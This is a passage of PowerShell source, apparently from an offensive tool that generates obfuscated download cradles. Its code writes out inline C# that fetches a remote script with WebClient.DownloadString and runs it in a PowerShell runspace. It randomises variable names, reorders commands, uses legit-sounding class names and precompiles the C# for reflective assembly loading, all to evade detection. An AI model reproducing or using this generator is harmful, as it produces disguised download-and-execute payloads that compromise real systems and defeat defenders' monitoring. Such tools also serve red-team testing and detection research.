                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''                            
                        }

                        If($CurrentModuleAutoLoadRandom)
                        {
                            $CommandArray += $CurrentModuleAutoLoadRandom
                        }

                        $CommandArray += $AddType.Replace($ModuleAutoLoadTag,'') + "$LanguageCSharp'$InlineCSharp'"
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            # Only add $Command if $InlineScriptTag was present in $Invoke (and currently removed and only left with <<<00>>> tags).
                            If($Command -AND !$Invoke.Contains('<<<00>>>'))
                            {
                                $CommandArray += $Command
                            }
                        }
                        
                        # Set command ordering arrangement logic here.
                        $Syntax = ($CommandArray -Join ';').Trim(';').Replace(';;',';').Replace(';;',';').Replace(';0>>>;',';0>>>')
                        
                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'inlineScript' # Inline Script
                    $RandomVarName2 = 'url'          # Url
                    $RandomVarName3 = 'command'      # Command (Post Cradle Command)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                    
                    # Throw warning message if Automation or AutomationRunspaces classes are chosen but Invoke option is not 11 (thus these classes are not present in the command).
                    If(!$Invoke.Contains($InlineScriptTag) -AND (@('Automation','AutomationRunspaces') -Contains $LastVariableName))
                    {
                        Write-Host "`n`nWARNING: Cannot obfuscate the '$LastVariableName' class since it is not present." -ForegroundColor Yellow
                        Write-Host "         Select Invoke\11 to introduce this class into ObfuscatedCommand.`n" -ForegroundColor Yellow
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','AddType','LanguageCSharp','SystemNet','Automation','AutomationRunspaces','ClassAndMethod')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
               
                        # Extract Class and Method names from $ClassAndMethod array.         
                        $ClassName  = $ClassAndMethod[0]
                        $MethodName = $ClassAndMethod[1]

                        # Array gets converted to a string when tags are applied earlier in the script, so we will split it back out and handle tags if they exist.
                        If($ClassAndMethod.GetType().Name -eq 'String')
                        {
                            $ClassName  = $ClassAndMethod.Split(' ')[0]
                            $MethodName = $ClassAndMethod.Split(' ')[1]
                            
                            # Handle tags if they exist.
                            If($ClassName.StartsWith('<<<0'))
                            {
                                $ClassName = $ClassName + '0>>>'
                            }
                            If($MethodName.EndsWith('0>>>'))
                            {
                                $MethodName = '<<<0' + $MethodName
                            }
                        }
                                                
                        # Extra steps to set and highlight two-part values -- Using and non-using for each class, and method/class name pair.
                        $UsingSystemNet = $SystemNet.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $SystemNet      = 'System.Net.'
                        If(($UsingSystemNet -ne '') -AND ($UsingSystemNet -ne '<<<00>>>'))
                        {
                            $SystemNet = ''
                        }
                        $UsingAutomation = $Automation.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $Automation      = 'System.Management.Automation.'
                        If(($UsingAutomation -ne '') -AND ($UsingAutomation -ne '<<<00>>>'))
                        {
                            $Automation = ''
                        }
                        $UsingAutomationRunspaces = $AutomationRunspaces.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $AutomationRunspaces = 'System.Management.Automation.Runspaces.'
                        If(($UsingAutomationRunspaces -ne '') -AND ($UsingAutomationRunspaces -ne '<<<00>>>'))
                        {
                            $AutomationRunspaces = ''
                        }

                        # Add tags for each class and method/class name if necessary.
                        If($UsingSystemNet.StartsWith('<<<0') -AND ($UsingSystemNet -ne ''))
                        {
                            $SystemNet = '<<<0' + $SystemNet + '0>>>'
                        }
                        If($UsingAutomation.StartsWith('<<<0') -AND ($UsingAutomation -ne ''))
                        {
                            $Automation = '<<<0' + $Automation + '0>>>'
                        }
                        If($UsingAutomationRunspaces.StartsWith('<<<0') -AND ($UsingAutomationRunspaces -ne ''))
                        {
                            $AutomationRunspaces = '<<<0' + $AutomationRunspaces + '0>>>'
                        }

                        # Set Inline CSharp syntaxes: first for default and second for if invoke option 11 (routed to 13) is selected.
                        $InlineCSharp             = "$UsingSystemNet`public class $ClassName{public static string $MethodName(string url){return (new $SystemNet`WebClient()).DownloadString(url);}}"
                        $InlineCSharpWithRunspace = "$UsingSystemNet$UsingAutomation$UsingAutomationRunspaces`public class $ClassName{public static void $MethodName(string url$InlineCommandParamTag){$AutomationRunspaces`Runspace rs=$AutomationRunspaces`RunspaceFactory.CreateRunspace();rs.Open();$Automation`PowerShell ps=$Automation`PowerShell.Create();ps.Runspace=rs;ps.AddScript((new $SystemNet`WebClient()).DownloadString(url)$InlineCommandTag);ps.Invoke();}}"

                        # Use this variable to denote if inline script invocation is occurring when Command is specified.
                        $CommandSetAsVariable = $NULL

                        # $InlineScriptTag is only present if option 11 was selected from the Invoke menu.
                        # If Command is defined then we should add an additional parameter and script syntax in $InlineCSharp.
                        If($Invoke.Contains($InlineScriptTag))
                        {
                            # Remove $InlineScriptTag from Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Set $Invoke to $InlineCSharpWithRunspace since the result will be invoked within the inline script.
                            $InlineCSharp = $InlineCSharpWithRunspace
                            
                            # We will add this parameter if $Command is defined.
                            $PostCradleCommandParam = ',string postcradlecommand'

                            # Add additional parameter for inline script and method invocation if $Command (PostCradleCommand) has been specified by the user. 
                            If($Command)
                            {
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,$PostCradleCommandParam)
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'+";"+postcradlecommand')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2,$GetVar3))"
                                $CommandSetAsVariable = "$SetVar3{$Command}"
                                $Command = $NULL
                            }
                            Else
                            {
                                # Remove tags if no $Command (PostCradleCommand) has been specified by the user.
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,'')
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2))"
                            }
                            
                            # Add tags to $SyntaxToInvoke if Rearrange or AllOptions were selected since $SyntaxToInvoke now is our invocation syntax since payload is being invoked inside of the PS Runspace.
                            If(($i -eq 2) -AND ($AllOptionsSelected -OR ($LastVariableName -eq 'Invoke')))
                            {
                                $SyntaxToInvoke = '<<<0' + $SyntaxToInvoke + '0>>>'
                            }
                        }
                        Else
                        {
                            # Remove $InlineScriptTag from $Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Remove $InlineScriptTag from $InlineCSharp.
                            $InlineCSharp = $InlineCSharp.Replace($InlineScriptTag,'')

                            $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2))"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($AddType.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom.Trim(';')
                            If($AddType.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''                            
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom
                        $CommandArray += "$SetVar1'$InlineCSharp'"
                        $CommandArray += "$SetVar2'$Url'"

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($CommandSetAsVariable)
                            {
                                $CommandArray += $CommandSetAsVariable
                            }
                            Else
                            {
                                $CommandArray += ''
                            }
                        }
                        Else
                        {
                            $CommandArray += ''
                        }

                        $CommandArray += $AddType.Replace($ModuleAutoLoadTag,'') + "$LanguageCSharp$GetVar1"
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }
                        
                        # Set command ordering arrangement logic here.
                        $Syntax = (($CommandArray[$InlineRandom]) -Join ';').Trim(';').Replace(';;',';').Replace(';;',';').Replace(';0>>>;',';0>>>')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                    
                    # Throw warning message if Automation or AutomationRunspaces classes are chosen but Invoke option is not 11 (thus these classes are not present in the command).
                    If(!$Invoke.Contains($InlineScriptTag) -AND (@('Automation','AutomationRunspaces') -Contains $LastVariableName))
                    {
                        Write-Host "`n`nWARNING: Cannot obfuscate the '$LastVariableName' class since it is not present." -ForegroundColor Yellow
                        Write-Host "         Select Invoke\11 to introduce this class into ObfuscatedCommand.`n" -ForegroundColor Yellow
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','AddType','LanguageCSharp','SystemNet','Automation','AutomationRunspaces','ClassAndMethod')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
               
                        # Extract Class and Method names from $ClassAndMethod array.         
                        $ClassName  = $ClassAndMethod[0]
                        $MethodName = $ClassAndMethod[1]

                        # Array gets converted to a string when tags are applied earlier in the script, so we will split it back out and handle tags if they exist.
                        If($ClassAndMethod.GetType().Name -eq 'String')
                        {
                            $ClassName  = $ClassAndMethod.Split(' ')[0]
                            $MethodName = $ClassAndMethod.Split(' ')[1]
                            
                            # Handle tags if they exist.
                            If($ClassName.StartsWith('<<<0'))
                            {
                                $ClassName = $ClassName + '0>>>'
                            }
                            If($MethodName.EndsWith('0>>>'))
                            {
                                $MethodName = '<<<0' + $MethodName
                            }
                        }
                                                
                        # Extra steps to set and highlight two-part values -- Using and non-using for each class, and method/class name pair.
                        $UsingSystemNet = $SystemNet.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $SystemNet      = 'System.Net.'
                        If(($UsingSystemNet -ne '') -AND ($UsingSystemNet -ne '<<<00>>>'))
                        {
                            $SystemNet = ''
                        }
                        $UsingAutomation = $Automation.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $Automation      = 'System.Management.Automation.'
                        If(($UsingAutomation -ne '') -AND ($UsingAutomation -ne '<<<00>>>'))
                        {
                            $Automation = ''
                        }
                        $UsingAutomationRunspaces = $AutomationRunspaces.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $AutomationRunspaces = 'System.Management.Automation.Runspaces.'
                        If(($UsingAutomationRunspaces -ne '') -AND ($UsingAutomationRunspaces -ne '<<<00>>>'))
                        {
                            $AutomationRunspaces = ''
                        }

                        # Add tags for each class and method/class name if necessary.
                        If($UsingSystemNet.StartsWith('<<<0') -AND ($UsingSystemNet -ne ''))
                        {
                            $SystemNet = '<<<0' + $SystemNet + '0>>>'
                        }
                        If($UsingAutomation.StartsWith('<<<0') -AND ($UsingAutomation -ne ''))
                        {
                            $Automation = '<<<0' + $Automation + '0>>>'
                        }
                        If($UsingAutomationRunspaces.StartsWith('<<<0') -AND ($UsingAutomationRunspaces -ne ''))
                        {
                            $AutomationRunspaces = '<<<0' + $AutomationRunspaces + '0>>>'
                        }

                        # Set Inline CSharp syntaxes: first for default and second for if invoke option 11 (routed to 13) is selected.
                        $InlineCSharp             = "$UsingSystemNet`public class $ClassName{public static string $MethodName(string url){return (new $SystemNet`WebClient()).DownloadString(url);}}"
                        $InlineCSharpWithRunspace = "$UsingSystemNet$UsingAutomation$UsingAutomationRunspaces`public class $ClassName{public static void $MethodName(string url$InlineCommandParamTag){$AutomationRunspaces`Runspace rs=$AutomationRunspaces`RunspaceFactory.CreateRunspace();rs.Open();$Automation`PowerShell ps=$Automation`PowerShell.Create();ps.Runspace=rs;ps.AddScript((new $SystemNet`WebClient()).DownloadString(url)$InlineCommandTag);ps.Invoke();}}"

                        # Use this variable to denote if inline script invocation is occurring when Command is specified.
                        $CommandSetAsVariable = $NULL

                        # $InlineScriptTag is only present if option 11 was selected from the Invoke menu.
                        # If Command is defined then we should add an additional parameter and script syntax in $InlineCSharp.
                        If($Invoke.Contains($InlineScriptTag))
                        {
                            # Remove $InlineScriptTag from Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Set $Invoke to $InlineCSharpWithRunspace since the result will be invoked within the inline script.
                            $InlineCSharp = $InlineCSharpWithRunspace
                            
                            # We will add this parameter if $Command is defined.
                            $PostCradleCommandParam = ',string postcradlecommand'

                            # Add additional parameter for inline script and method invocation if $Command (PostCradleCommand) has been specified by the user. 
                            If($Command)
                            {
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,$PostCradleCommandParam)
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'+";"+postcradlecommand')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2,$GetVar3))"
                                $CommandSetAsVariable = "$SetVar3{$Command}"
                                $Command = $NULL
                            }
                            Else
                            {
                                # Remove tags if no $Command (PostCradleCommand) has been specified by the user.
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,'')
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2))"
                            }
                            
                            # Add tags to $SyntaxToInvoke if Rearrange or AllOptions were selected since $SyntaxToInvoke now is our invocation syntax since payload is being invoked inside of the PS Runspace.
                            If(($i -eq 2) -AND ($AllOptionsSelected -OR ($LastVariableName -eq 'Invoke')))
                            {
                                $SyntaxToInvoke = '<<<0' + $SyntaxToInvoke + '0>>>'
                            }
                        }
                        Else
                        {
                            # Remove $InlineScriptTag from $Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Remove $InlineScriptTag from $InlineCSharp.
                            $InlineCSharp = $InlineCSharp.Replace($InlineScriptTag,'')

                            $SyntaxToInvoke = "([$ClassName]::$MethodName($GetVar2))"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()

                        If($AddType.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom.Trim(';')
                            If($AddType.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''                            
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom
                        $CommandArray += "$SetVar1'$InlineCSharp'"
                        $CommandArray += "$SetVar2'$Url'"

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($CommandSetAsVariable)
                            {
                                $CommandArray += $CommandSetAsVariable
                            }
                            Else
                            {
                                $CommandArray += ''
                            }
                        }
                        Else
                        {
                            $CommandArray += ''
                        }

                        $CommandArray += $AddType.Replace($ModuleAutoLoadTag,'') + "$LanguageCSharp$GetVar1"
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command)
                            {
                                $CommandArray += $Command
                            }
                        }
                        
                        # Set command ordering arrangement logic here.
                        $Syntax = (($CommandArray[$InlineRandom]) -Join ';').Trim(';').Replace(';;',';').Replace(';;',';').Replace(';0>>>;',';0>>>')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,@($TokenNameUpdatedThisIteration,$TokenValueUpdatedThisIteration))
        }
        16 {
            ##########################################################################
            ## PSCOMPILEDCSHARP - Pre-Compiled CSharp + [Reflection.Assembly]::Load ##
            ##########################################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Throw warning message if Automation or AutomationRunspaces classes are chosen but Invoke option is not 11 (thus these classes are not present in the command).
                    If(!$Invoke.Contains($InlineScriptTag) -AND (@('Automation','AutomationRunspaces') -Contains $LastVariableName))
                    {
                        Write-Host "`n"
                        Write-Host "WARNING: " -NoNewline -ForegroundColor Yellow
                        Write-Host "Cannot obfuscate the '" -NoNewLine
                        Write-Host $LastVariableName -NoNewline -ForegroundColor Yellow
                        Write-Host "' class since it is not present."
                        Write-Host "         Select Invoke\11 to introduce this class into ObfuscatedCommand."
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','SystemNet','Automation','AutomationRunspaces','ClassAndMethod','ReflectionAssembly','Load')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
               
                        # Extract Class and Method names from $ClassAndMethod array.         
                        $ClassName  = $ClassAndMethod[0]
                        $MethodName = $ClassAndMethod[1]

                        # Array gets converted to a string when tags are applied earlier in the script, so we will split it back out and handle tags if they exist.
                        If($ClassAndMethod.GetType().Name -eq 'String')
                        {
                            $ClassName  = $ClassAndMethod.Split(' ')[0]
                            $MethodName = $ClassAndMethod.Split(' ')[1]
                            
                            # Handle tags if they exist.
                            If($ClassName.StartsWith('<<<0'))
                            {
                                $ClassName = $ClassName + '0>>>'
                            }
                            If($MethodName.EndsWith('0>>>'))
                            {
                                $MethodName = '<<<0' + $MethodName
                            }
                        }
                                                
                        # Extra steps to set and highlight two-part values -- Using and non-using for each class, and method/class name pair.
                        $UsingSystemNet = $SystemNet.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $SystemNet      = 'System.Net.'
                        If(($UsingSystemNet -ne '') -AND ($UsingSystemNet -ne '<<<00>>>'))
                        {
                            $SystemNet = ''
                        }
                        $UsingAutomation = $Automation.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $Automation      = 'System.Management.Automation.'
                        If(($UsingAutomation -ne '') -AND ($UsingAutomation -ne '<<<00>>>'))
                        {
                            $Automation = ''
                        }
                        $UsingAutomationRunspaces = $AutomationRunspaces.ToString().Trim().Replace('<<<0 0>>>','<<<00>>>')
                        $AutomationRunspaces = 'System.Management.Automation.Runspaces.'
                        If(($UsingAutomationRunspaces -ne '') -AND ($UsingAutomationRunspaces -ne '<<<00>>>'))
                        {
                            $AutomationRunspaces = ''
                        }

                        # Add tags for each class and method/class name if necessary.
                        If($UsingSystemNet.StartsWith('<<<0') -AND ($UsingSystemNet -ne ''))
                        {
                            $SystemNet = '<<<0' + $SystemNet + '0>>>'
                        }
                        If($UsingAutomation.StartsWith('<<<0') -AND ($UsingAutomation -ne ''))
                        {
                            $Automation = '<<<0' + $Automation + '0>>>'
                        }
                        If($UsingAutomationRunspaces.StartsWith('<<<0') -AND ($UsingAutomationRunspaces -ne ''))
                        {
                            $AutomationRunspaces = '<<<0' + $AutomationRunspaces + '0>>>'
                        }

                        # Set Inline CSharp syntaxes: first for default and second for if invoke option 11 (routed to 13) is selected.
                        $InlineCSharp             = "$UsingSystemNet`public class $ClassName{public static string $MethodName(string url){return (new $SystemNet`WebClient()).DownloadString(url);}}"
                        $InlineCSharpWithRunspace = "$UsingSystemNet$UsingAutomation$UsingAutomationRunspaces`public class $ClassName{public static void $MethodName(string url$InlineCommandParamTag){$AutomationRunspaces`Runspace rs=$AutomationRunspaces`RunspaceFactory.CreateRunspace();rs.Open();$Automation`PowerShell ps=$Automation`PowerShell.Create();ps.Runspace=rs;ps.AddScript((new $SystemNet`WebClient()).DownloadString(url)$InlineCommandTag);ps.Invoke();}}"

                        # Use this variable to denote if inline script invocation is occurring when Command is specified.
                        $CommandSetAsVariable = $NULL

                        # $InlineScriptTag is only present if option 11 was selected from the Invoke menu.
                        # If Command is defined then we should add an additional parameter and script syntax in $InlineCSharp.
                        If($Invoke.Contains($InlineScriptTag))
                        {
                            # Remove $InlineScriptTag from Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Set $Invoke to $InlineCSharpWithRunspace since the result will be invoked within the inline script.
                            $InlineCSharp = $InlineCSharpWithRunspace
                            
                            # We will add this parameter if $Command is defined.
                            $PostCradleCommandParam = ',string postcradlecommand'

                            # Add additional parameter for inline script and method invocation if $Command (PostCradleCommand) has been specified by the user. 
                            If($Command)
                            {
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,$PostCradleCommandParam)
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'+";"+postcradlecommand')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName('$Url',{$Command}))"
                                $Command = $NULL
                            }
                            Else
                            {
                                # Remove tags if no $Command (PostCradleCommand) has been specified by the user.
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandParamTag,'')
                                $InlineCSharp = $InlineCSharp.Replace($InlineCommandTag,'')
                                $SyntaxToInvoke = "([$ClassName]::$MethodName('$Url'))"
                            }
                            
                            # Add tags to $SyntaxToInvoke if Rearrange or AllOptions were selected since $SyntaxToInvoke now is our invocation syntax since payload is being invoked inside of the PS Runspace.
                            If(($i -eq 2) -AND ($AllOptionsSelected -OR ($LastVariableName -eq 'Invoke')))
                            {
                                $SyntaxToInvoke = '<<<0' + $SyntaxToInvoke + '0>>>'
                            }
                        }
                        Else
                        {
                            # Remove $InlineScriptTag from $Invoke since we have this value in Invoke only to communicate that the Invoke option 11 (routed to 13) was selected.
                            $Invoke = $Invoke.Replace($InlineScriptTag,'')

                            # Remove $InlineScriptTag from $InlineCSharp.
                            $InlineCSharp = $InlineCSharp.Replace($InlineScriptTag,'')

                            $SyntaxToInvoke = "([$ClassName]::$MethodName('$Url'))"
                        }

                        # Only deal with compilation on the first iteration since it will be the same for the second iteration.
                        If($i -eq 1)
                        {
                            # We will get $BytesAsString either from compiling CSharp code or retrieving from last iteration if the CSharp code has not changed (and does not need re-compiling).
                            $BytesAsString = ''

                            # Check if Class and Method names need to be updated. This is needed if All\1 is selected first.
                            $ClassAndMethodNeedUpdating = $TRUE
                            ForEach($PrecompiledOption in ($LegitSoundingClassAndMethodCompiledDefault + $LegitSoundingClassAndMethodCompiledNormal + $LegitSoundingClassAndMethodCompiledRandom))
                            {
                                $ClassAndMethodSyntax = "[$($PrecompiledOption[0])]::$($PrecompiledOption[1])("

                                If($SyntaxToInvoke.Replace('<<<0','').Replace('0>>>','').Contains($ClassAndMethodSyntax))
                                {
                                    $ClassAndMethodNeedUpdating = $FALSE
                                }
                            }

                            # Only re-compile $InlineCSharp if it has changed from the last compiled version.
                            If(!$ClassAndMethodNeedUpdating -AND ($Script:LastInlineCSharp.Length -gt 0) -AND ($Script:LastInlineCSharp -eq $InlineCSharp.Replace('<<<0','').Replace('0>>>','')))
                            {
                                $BytesAsString = $Script:LastBytesAsString
                            }
                            Else
                            {
                                # Check if csc.exe is present. If not (like if running PowerShell on a non-Windows OS) then select from handful of pre-compiled versions and output warning to user.
                                $PathToCscArray = Get-ChildItem $env:windir\Microsoft.NET\Framework*\v*\csc.exe | ForEach-Object {$_.FullName}

                                Write-Host "`n"

                                If($PathToCscArray.Count -eq 0)
                                {
                                    Write-Host "WARNING: " -NoNewLine -ForegroundColor Yellow
                                    Write-Host "Could not find " -NoNewLine
                                    Write-Host "csc.exe" -NoNewLine -ForegroundColor Yellow
                                    Write-Host " on this computer. Switching to small list of pre-compiled samples. (I.e. not very random)"

                                    # Use the input $ClassName to find pre-compiled CSharp sample with corresponding class name.
                                    If($ClassName -eq 'Class')
                                    {
                                        $PrecompiledCSharp = Get-Random -Input $LegitSoundingClassAndMethodCompiledDefault
                                    }
                                    ElseIf(($LegitSoundingClassAndMethodCompiledNormal | ForEach-Object {$_[0]}) -Contains $ClassName)
                                    {
                                        $PrecompiledCSharp = $LegitSoundingClassAndMethodCompiledNormal | Where-Object {$_[0] -eq $ClassName}
                                    }
                                    Else
                                    {
                                        $PrecompiledCSharp = Get-Random -Input $LegitSoundingClassAndMethodCompiledRandom
                                    }
                                    
                                    # Also update $SyntaxToInvoke and $InlineCSharp to reflect this updated ClassName and MethodName.
                                    $SyntaxToInvoke = $SyntaxToInvoke.Replace($ClassName,$PrecompiledCSharp[0]).Replace($MethodName,$PrecompiledCSharp[1])
                                    $InlineCSharp   = $InlineCSharp.Replace("public class $ClassName{","public class $($PrecompiledCSharp[0]){").Replace(" $MethodName(string "," $($PrecompiledCSharp[1])(string ")

                                    # Update current $ClassName, $MethodName, and $BytesAsString for remainder of this iteration.
                                    $ClassName  = $PrecompiledCSharp[0]
                                    $MethodName = $PrecompiledCSharp[1]

                                    # Handle extraction of correct pre-compiled CSharp (out of three possible options per each pre-compiled version).
                                    If($PostCradleCommandParam.Length -eq 0)
                                    {
                                        # Extract pre-compiled version that takes one argument as input and Invoke 11 is not selected.
                                        $BytesAsString = $PrecompiledCSharp[2][0]
                                    }
                                    ElseIf(!$SyntaxToInvoke.Contains(','))
                                    {   
                                        # Extract pre-compiled version that takes two arguments as input and Invoke 11 was selected but no $PostCradleCommand.
                                        $BytesAsString = $PrecompiledCSharp[2][1]
                                    }
                                    Else
                                    {   
                                        # Extract pre-compiled version that takes two arguments as input and Invoke 11 was selected and $PostCradleCommand is set.
                                        $BytesAsString = $PrecompiledCSharp[2][2]
                                    }

                                    # Extract ClassName, MethodName, and BytesAsString from above assigned pre-compiled CSharp and update 'WithTags' for next iteration.
                                    If($ClassAndMethodWithTags.GetType().Name -eq 'Object[]')
                                    {
                                        $ClassAndMethodWithTags = @($ClassName,$MethodName)
                                    }
                                    Else
                                    {
                                        $ClassAndMethodWithTags = '<<<0' + $ClassName + ' ' + $MethodName + '0>>>'
                                    }

                                    # Set updated $InlineCSharp and $BytesAsString into Script-level variables so we can just retrieve them next iteration if no re-compiling is necessary.
                                    $Script:LastInlineCSharp  = $InlineCSharp
                                    $Script:LastBytesAsString = $BytesAsString
                                }
                                Else
                                {
                                    # Temporary .cs and .dll files for CSharp compilation.
                                    $TempFileCs  = "$ScriptDir\cradle.cs"
                                    $TempFileDll = "$ScriptDir\cradle.dll"

                                    # Remove previous .cs and .dll CSharp artifacts if they exist from previous run.
                                    ForEach($TempFile in @($TempFileCs,$TempFileDll))
                                    {
                                        If(Test-Path $TempFile)
                                        {
                                            Remove-Item $TempFile
                                        }
                                    }

                                    # Write out $InlineCSharp to disk so we can compile to .dll with csc.exe and then read in the compiled bytes.
                                    Write-Output $InlineCSharp > $TempFileCs

                                    # Retrieve path to System.Management.Automation.dll for csc.exe command to be able to identify referenced assembly.
